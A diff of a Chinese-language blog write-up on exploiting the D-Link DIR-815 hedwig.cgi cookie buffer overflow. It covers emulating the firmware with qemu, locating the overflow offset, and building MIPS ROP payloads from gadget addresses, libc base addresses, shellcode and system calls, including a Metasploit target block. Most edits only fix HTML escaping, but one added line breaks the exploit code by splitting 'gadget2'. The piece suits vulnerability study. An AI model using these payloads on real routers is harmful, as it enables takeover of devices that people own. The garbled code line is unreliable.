@@ -87,7 +87,7 @@ Buffer overflow on “hedwig.cgi”Another buffer overflow affects the “hedwig
 <li>固件下载：<a href="ftp://ftp2.dlink.com/PRODUCTS/DIR-815/REVA/DIR-815_FIRMWARE_1.01.ZIP">ftp://ftp2.dlink.com/PRODUCTS/DIR-815/REVA/DIR-815_FIRMWARE_1.01.ZIP</a></li>
 </ul>
 <h1 id="漏洞定位"><a href="#漏洞定位" class="headerlink" title="漏洞定位"></a>漏洞定位</h1><p><code>binwalk -Me</code>解压 </p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5Cbinwalk.png" alt="">  </p>
+<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/binwalk.png" alt="">  </p>
 <p>该漏洞的核心组件为hedwig.cgi，<code>find . -name '*cgi'</code>查找文件，并<code>ls -l ./htdocs/web/hedwig.cgi</code>发现hedwig.cgi是指向./htdocs/cgibin的符号链接，也就是说真正的漏洞代码在cgibin中。   </p>
 <p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/find-name.png" alt=""></p>
 <p>由之前的漏洞介绍可以知道<code>HTTP_COOKIE</code>过长导致漏洞，分别用IDA和ghidra打开cgibin这个文件，在string窗口中进行搜索<code>HTTP_COOKIE</code>。</p>
@@ -146,7 +146,7 @@ test=$(python -c "print 'uid='+open('test','r').read(2000)")
 LEN=$(echo -n "$test" | wc -c)
 PORT="23957"
 cp $(which qemu-mipsel-static) ./qemu
-sudo chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencoded" -E REQUEST_METHOD="POST" -E HTTP_COOKIE=$test -E REQUEST_URL="/hedwig.cgi" -E REMOTE_ADDR="127.0.0.1" -g $PORT /htdocs/web/hedwig.cgi 2>/dev/null
+sudo chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencoded" -E REQUEST_METHOD="POST" -E HTTP_COOKIE=$test -E REQUEST_URL="/hedwig.cgi" -E REMOTE_ADDR="127.0.0.1" -g $PORT /htdocs/web/hedwig.cgi 2&gt;/dev/null
 rm -f ./qemu</code></pre>
 <p>在这之前需要利用patternLocOffset.py生成test文件，包含特定格式的2000个字符串。</p>
 <p><code>python patternLocOffset.py -c -l 2000 -f test</code></p>
@@ -400,7 +400,7 @@ Control
         <span class="token string">"            {"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">.</span>
         <span class="token string">"                /usr/sbin/phpcgi { txt }"</span><span class="token punctuation">.</span>    <span class="token string">"\n"</span><span class="token punctuation">.</span>
         <span class="token string">"            }"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$widget</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">echo</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$widget</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">echo</span>
         <span class="token string">"            External"</span><span class="token punctuation">.</span>                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
         <span class="token string">"            {"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">.</span>
         <span class="token string">"                /usr/sbin/phpcgi { router_info.xml }"</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">.</span>
@@ -417,7 +417,7 @@ Control
         <span class="token string">'           Location /htdocs/smart404'</span><span class="token punctuation">.</span>     <span class="token string">'\n'</span><span class="token punctuation">.</span>
         <span class="token string">'       }'</span><span class="token punctuation">.</span>                                 <span class="token string">'\n'</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$hnap</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$hnap</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
     <span class="token punctuation">{</span>
         <span class="token keyword">echo</span>
         <span class="token string">"        Control"</span><span class="token punctuation">.</span>                            <span class="token string">"\n"</span><span class="token punctuation">.</span>
@@ -516,7 +516,7 @@ Control
     <span class="token punctuation">}</span>
 <span class="token punctuation">}</span>
 
-<span class="token delimiter">?></span></code></pre>
+<span class="token delimiter">?&gt;</span></code></pre>
 <p>可以了解到该php用于生成配置文件，由于我们只需要其中的http服务，可以按照该配置文件改写我们所需的conf。</p>
 <pre class=" language-php"><code class="language-php">Umask <span class="token number">026</span>
 PIDFile <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>run<span class="token operator">/</span>httpd<span class="token punctuation">.</span>pid
@@ -626,19 +626,19 @@ ln -s  /htdocs/cgibin /usr/sbin/hnap
 <pre class=" language-sh"><code class="language-sh">#curl http://192.168.79.143:1234/hedwig.cgi -v -X POST -H "Content-Length: 8" -b  "uid=zh"
 *   Trying 192.168.79.143...
 * Connected to 192.168.79.143 (192.168.79.143) port 1234 (#0)
-> POST /hedwig.cgi HTTP/1.1
-> Host: 192.168.79.143:1234
-> User-Agent: curl/7.47.0
-> Accept: */*
-> Cookie: uid=zh
-> Content-Length: 8
-> 
-< HTTP/1.1 200 OK
-< Server: Linux, HTTP/1.1, 
-< Date: Sun, 24 May 2020 01:00:46 GMT
-< Transfer-Encoding: chunked
-< Content-Type: text/xml
-< 
+&gt; POST /hedwig.cgi HTTP/1.1
+&gt; Host: 192.168.79.143:1234
+&gt; User-Agent: curl/7.47.0
+&gt; Accept: */*
+&gt; Cookie: uid=zh
+&gt; Content-Length: 8
+&gt; 
+&lt; HTTP/1.1 200 OK
+&lt; Server: Linux, HTTP/1.1, 
+&lt; Date: Sun, 24 May 2020 01:00:46 GMT
+&lt; Transfer-Encoding: chunked
+&lt; Content-Type: text/xml
+&lt; 
 * Connection #0 to host 192.168.79.143 left intact
 <hedwig><result>FAILED</result><message>no xml data.</message></hedwig>% </code></pre>
 <p>然后在mips虚拟机查看log文件：</p>
@@ -703,14 +703,14 @@ root@debian-mipsel:~/squashfs-root# export HTTP_COOKIE="uid=1234"
 root@debian-mipsel:~/squashfs-root# export REQUEST_METHOD="POST"
 root@debian-mipsel:~/squashfs-root# export REQUEST_URI="/hedwig.cgi"
 
-root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi & cat /proc/pid/maps
+root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi &amp; cat /proc/pid/maps
 [10] 1052
 cat: /proc/pid/maps: No such file or directory
-root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi & cat /proc/pid/maps
+root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi &amp; cat /proc/pid/maps
 [11] 1054
 cat: /proc/pid/maps: No such file or directory
 [10]+  Stopped                 /htdocs/web/hedwig.cgi
-root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi & cat /proc/1056/maps 
+root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi &amp; cat /proc/1056/maps 
 [12] 1056
 00400000-0041c000 r-xp 00000000 08:01 32694      /htdocs/cgibin
 0042c000-0042d000 rw-p 0001c000 08:01 32694      /htdocs/cgibin
@@ -806,18 +806,18 @@ gadget4 = 0x1DD08#0x15C84#0xBB44
 
 payload = 'A' * 973 #1009-9*4
 payload += 'A' * 4                           # s0
-payload += p32(libc_base + gadget2)       # s1 = mipsrop.tail() && move $ra,$(sp+0x24) && jr s2
+payload += p32(libc_base + gadget2)       # s1 = mipsrop.tail() &amp;&amp; move $ra,$(sp+0x24) &amp;&amp; jr s2
 payload += p32(libc_base + sleep)         # s2 = jr $(sp+0x24)
 payload += 'A' * 4                        # s3
-payload += p32(libc_base + gadget4)       # s4 = mipsrop.find("move $t9,$s1") && jr shellcode
+payload += p32(libc_base + gadget4)       # s4 = mipsrop.find("move $t9,$s1") &amp;&amp; jr shellcode
 payload += 'A' * 4                           # s5
 payload += 'A' * 4                        # s6
 payload += 'A' * 4                        # s7
 payload += 'A' * 4                        # fp
-payload += p32(libc_base + gadget1)       # ra = mipsrop.find("li $a0,1") && jr s1
+payload += p32(libc_base + gadget1)       # ra = mipsrop.find("li $a0,1") &amp;&amp; jr s1
 
 payload += 'B' * 0x24 # mipsrop.tail() 0x24B padding
-payload += p32(libc_base + gadget3)       # $(sp+0x24) = mipsrop.stackfinder() && move s1,$(sp+0x18) && jr $s4
+payload += p32(libc_base + gadget3)       # $(sp+0x24) = mipsrop.stackfinder() &amp;&amp; move s1,$(sp+0x18) &amp;&amp; jr $s4
 
 payload += 'c' * 0x18 # mipsrop.stackfinder() 0x18B padding
 payload += shellcode
@@ -963,12 +963,12 @@ Service Info: OS: Linux; Device: WAP; CPE: cpe:/h:dlink:dir-815:1.01, cpe:/o:lin
 <p>其实这里需要跟之前qemu系统模式一样，上传gdbsever进行调试确定偏移和libc基地址。这里直接利用师傅帖子中的代码进行测试。这里的基地址是根据firmadyne中用linux内核版本为2.6.32，别的帖子中测试的基地址为0x2aaf8000，并且metasploit里面的<a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/dlink_hedwig_cgi_bof.rb" target="_blank" rel="noopener">payload</a>写到：路由器环境中基地址为0x2aaf8000，qemu环境为0x40854000。两个可以都试试！</p>
 <pre class=" language-sh"><code class="language-sh">[ 'Multiple Targets: D-Link DIR-645 v1.03, DIR-300 v2.14, DIR-600',
             {
-              'Offset'      => 973,
-              'LibcBase'    => 0x2aaf8000,    # Router
-              #'LibcBase'   => 0x40854000,    # QEMU environment
-              'System'      => 0x000531FF,    # address of system
-              'CalcSystem'  => 0x000158C8,    # calculate the correct address of system
-              'CallSystem'  => 0x000159CC,    # call our system
+              'Offset'      =&gt; 973,
+              'LibcBase'    =&gt; 0x2aaf8000,    # Router
+              #'LibcBase'   =&gt; 0x40854000,    # QEMU environment
+              'System'      =&gt; 0x000531FF,    # address of system
+              'CalcSystem'  =&gt; 0x000158C8,    # calculate the correct address of system
+              'CallSystem'  =&gt; 0x000159CC,    # call our system
             }
           ]</code></pre>
 <p>下面编写exp进行测试，利用system函数进行测试。</p>
@@ -986,7 +986,7 @@ context<span class="token punctuation">.</span>arch <span class="token operator"
     system_addr_1 <span class="token operator">=</span> <span class="token number">0x53200</span><span class="token operator">-</span><span class="token number">1</span>
     payload <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> offset
     payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> system_addr_1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s0</span>
-    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget2<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># s1</span>
+    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> g    adget2<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># s1</span>
     payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s2</span>
     payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s3</span>
     payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s4</span>
